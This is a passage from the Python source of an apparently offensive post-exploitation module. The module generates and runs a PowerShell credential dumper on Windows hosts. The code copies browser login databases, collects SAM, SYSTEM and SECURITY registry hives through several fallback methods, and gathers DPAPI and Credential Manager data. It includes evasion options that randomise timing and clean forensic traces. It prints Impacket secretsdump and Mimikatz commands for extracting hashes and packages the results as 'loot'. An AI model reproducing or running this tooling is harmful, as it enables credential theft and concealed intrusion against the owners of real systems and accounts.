            "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
            "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Web Data",
            # Firefox
            "$env:APPDATA\\Mozilla\\Firefox\\Profiles",
            # Edge
            "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
        )
        
        $browserFiles = @()
        foreach ($path in $browserPaths) {
            if (Test-Path $path) {
                if (Test-Path $path -PathType Container) {
                    $files = Get-ChildItem $path -Recurse -File -ErrorAction SilentlyContinue | 
                             Where-Object {$_.Name -like "*login*" -or $_.Name -like "*web*" -or $_.Name -like "*signon*"}
                    $browserFiles += $files
                } else {
                    $browserFiles += Get-Item $path -ErrorAction SilentlyContinue
                }
            }
        }
        
        if ($browserFiles.Count -gt 0) {
            $results += "[+] Found $($browserFiles.Count) browser credential files"
            
            # Save browser files for analysis
            $browserDir = Join-Path $tmp "Browser"
            New-Item -ItemType Directory -Path $browserDir -Force | Out-Null
            
            foreach ($file in $browserFiles) {
                $dest = Join-Path $browserDir $file.Name
                Copy-Item $file.FullName $dest -ErrorAction SilentlyContinue
            }
            
            $results += "[+] Browser files saved to: $browserDir"
            $paths['Browser'] = $browserDir
        } else {
            $results += "[-] No browser credential files found"
        }
        
    } catch {
        $results += "[!] Browser credential dump error: $_"
    }
    
    return $results, $paths
}
""")
        
        # Add cleanup function
        if cleanup:
            ps_parts.append(self._generate_cleanup_function(cleanup))
        
        # Add main execution logic
        execution_logic = """
# Determine which methods to try based on mode
$methodsToTry = @()
$extendedMethods = @()

switch ($method) {
    'regapi'    { $methodsToTry = @('Dump-RegistryAPI') }
    'direct'    { $methodsToTry = @('Dump-DirectFile') }
    'vss'       { $methodsToTry = @('Dump-VSS') }
    'memory'    { $methodsToTry = @('Dump-Memory') }
    'lsadump'   { $methodsToTry = @('Dump-LSA') }
    'all'       { 
        $methodsToTry = @('Dump-RegistryAPI', 'Dump-DirectFile', 'Dump-VSS', 'Dump-Memory', 'Dump-LSA')
        if (${str(extended).lower()}) {
            $extendedMethods = @('Dump-DPAPI', 'Dump-CredentialManager', 'Dump-BrowserCredentials')
        }
    }
    default     { 
        # Auto mode: try stealthy methods first
        $methodsToTry = @('Dump-RegistryAPI', 'Dump-DirectFile', 'Dump-VSS')
        if (${str(extended).lower()}) {
            $extendedMethods = @('Dump-DPAPI', 'Dump-CredentialManager', 'Dump-BrowserCredentials')
        }
    }
}

# Track which hives we've obtained
$obtainedHives = @{}
$totalAttempts = 0
$maxTotalAttempts = $maxRetries * $methodsToTry.Count

# Primary credential dumping (SAM/SYSTEM/SECURITY)
foreach ($methodFunc in $methodsToTry) {
    $retryCount = 0
    
    while ($retryCount -lt $maxRetries -and $obtainedHives.Count -lt 3) {
        $totalAttempts++
        
        if ($retryCount -gt 0) {
            $results += "[*] Retry $retryCount of $methodFunc"
            if ($evasion) {
                Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)
            }
        }
        
        # Call the method function
        $results, $paths = & $methodFunc $tmp $results $paths
        
        # Update obtained hives
        foreach ($hive in @('SAM','SYSTEM','SECURITY')) {
            if ($paths.ContainsKey($hive) -and -not $obtainedHives.ContainsKey($hive)) {
                $obtainedHives[$hive] = $paths[$hive]
                $results += "[+] Obtained $hive via $methodFunc"
            }
        }
        
        # Check if we have all primary hives
        if ($obtainedHives.Count -eq 3) {
            $results += "[+] All primary hives obtained"
            break
        }
        
        $retryCount++
    }
    
    if ($obtainedHives.Count -eq 3) {
        break
    }
    
    # Safety check to prevent infinite loops
    if ($totalAttempts -ge $maxTotalAttempts) {
        $results += "[!] Maximum attempts reached ($totalAttempts)"
        break
    }
}

# Extended credential dumping (if enabled and we have time/space)
if ($extendedMethods.Count -gt 0 -and $obtainedHives.Count -gt 0) {
    $results += '[Extended Credential Dumping]'
    
    foreach ($extMethod in $extendedMethods) {
        # Check if we should continue (time/space constraints)
        if ($obtainedHives.Count -eq 3 -or $totalAttempts -lt $maxTotalAttempts) {
            $results, $paths = & $extMethod $tmp $results $paths
        } else {
            $results += "[*] Skipping $extMethod due to constraints"
        }
    }
}

# Summary
 $results += '[Summary]'
 
 # Primary hives summary
 $primaryHiveCount = $obtainedHives.Count
 $results += "  Primary Hives (SAM/SYSTEM/SECURITY): $primaryHiveCount/3 obtained"
 
 foreach ($h in @('SAM','SYSTEM','SECURITY')) {
     if ($obtainedHives.ContainsKey($h)) {
         $results += "    $h : $($obtainedHives[$h])"
     } else {
         $results += "    $h : MISSING"
     }
 }
 
 # Extended sources summary
 $extendedSourceCount = ($paths.Keys | Where-Object { $_ -in @('DPAPI', 'Vault', 'Browser', 'LSA') } | Measure-Object).Count
 if ($extendedSourceCount -gt 0) {
     $results += "  Extended Sources: $extendedSourceCount obtained"
     foreach ($key in @('DPAPI', 'Vault', 'Browser', 'LSA')) {
         if ($paths.ContainsKey($key)) {
             $results += "    $key : $($paths[$key])"
         }
     }
 }
 
 # Extraction instructions
 if ($primaryHiveCount -eq 3) {
     $results += '[+] Extraction command (Impacket):'
     $results += '    secretsdump.py -sam $obtainedHives["SAM"] -system $obtainedHives["SYSTEM"] -security $obtainedHives["SECURITY"] LOCAL'
     $results += '[+] Alternative (Mimikatz):'
     $results += '    Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam"'
 } else {
     $results += '[-] Incomplete primary hive set.'
     if ($primaryHiveCount -gt 0) {
         $results += '[!] Partial extraction possible with obtained hives'
     }
     $results += '[?] Try different method or check elevation requirements'
 }
 
 # Analysis recommendations
 $results += '[Analysis Recommendations]'
 if ($paths.ContainsKey('DPAPI')) {
     $results += '  • DPAPI: Use dpapick or Mimikatz dpapi:: commands'
 }
 if ($paths.ContainsKey('Vault')) {
     $results += '  • Vault: Use VaultCmd or custom parsers'
 }
 if ($paths.ContainsKey('Browser')) {
     $results += '  • Browser: Use BrowserPasswordDump or similar tools'
 }
 
 # Operational notes
 $results += '[Operational Notes]'
 $results += "  • Total attempts: $totalAttempts"
 $results += "  • Evasion enabled: $evasion"
 $results += "  • Extended mode: ${str(extended).lower()}"
 if ($evasion) {
     $results += '  • Forensic traces cleaned: Yes'
 }

# Cleanup
        if ($cleanup -and (Test-Path $tmp)) {
            $cleanupResults = Cleanup-TempFiles $tmp $paths
            $results += $cleanupResults
        }
        
        # Forensic trace cleanup (if evasion enabled)
        if ($evasion) {
            $forensicResults = Clean-ForensicTraces
            $results += $forensicResults
        }

$results -join \"`n\"
"""
        
        # Add parameters to execution logic
        execution_logic = execution_logic.replace('$method', f"'{method}'")
        execution_logic = execution_logic.replace('$maxRetries', str(max_retries))
        
        ps_parts.append(execution_logic)
        
        # Combine all parts
        ps_script = "\n".join(ps_parts)
        
        # Execute
        r = ctx.ps(ps_script)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        
        # Parse results for loot
        loot_data = {}
        output_lines = r["output"].split('\n')
        
        # Track parsing state
        in_primary_section = False
        in_extended_section = False
        
        for line in output_lines:
            line = line.strip()
            
            # Detect section boundaries
            if line.startswith('Primary Hives (SAM/SYSTEM/SECURITY):'):
                in_primary_section = True
                in_extended_section = False
                continue
            elif line.startswith('Extended Sources:'):
                in_primary_section = False
                in_extended_section = True
                continue
            elif line.startswith('[Analysis Recommendations]'):
                in_primary_section = False
                in_extended_section = False
                break
            
            # Parse primary hives
            if in_primary_section and ' : ' in line:
                parts = line.split(' : ', 1)
                if len(parts) == 2:
                    item_name, item_path = parts
                    item_name = item_name.strip()
                    item_path = item_path.strip()
                    
                    if item_path != 'MISSING' and item_name in ['SAM', 'SYSTEM', 'SECURITY']:
                        loot_data[item_name] = item_path
            
            # Parse extended sources
            if in_extended_section and ' : ' in line:
                parts = line.split(' : ', 1)
                if len(parts) == 2:
                    source_name, source_path = parts
                    source_name = source_name.strip()
                    source_path = source_path.strip()
                    
                    if source_name in ['DPAPI', 'Vault', 'Browser', 'LSA']:
                        loot_data[source_name] = source_path
        
        # Add operational metadata
        if evasion:
            loot_data['EvasionEnabled'] = 'Yes'
            loot_data['ForensicCleanup'] = 'Yes'
        
        if extended:
            loot_data['ExtendedMode'] = 'Yes'
        
        loot_data['Method'] = method
        loot_data['MaxRetries'] = str(max_retries)
        
        return ModuleResult.ok(
            data=r["output"], 
            loot_kind="credential_dump",
            loot_data=loot_data if loot_data else None,
            loot_metadata={
                'primary_hives': sum(1 for k in loot_data.keys() if k in ['SAM', 'SYSTEM', 'SECURITY']),
                'extended_sources': sum(1 for k in loot_data.keys() if k in ['DPAPI', 'Vault', 'Browser', 'LSA']),
                'evasion_enabled': evasion,
                'extended_mode': extended
            }
        )
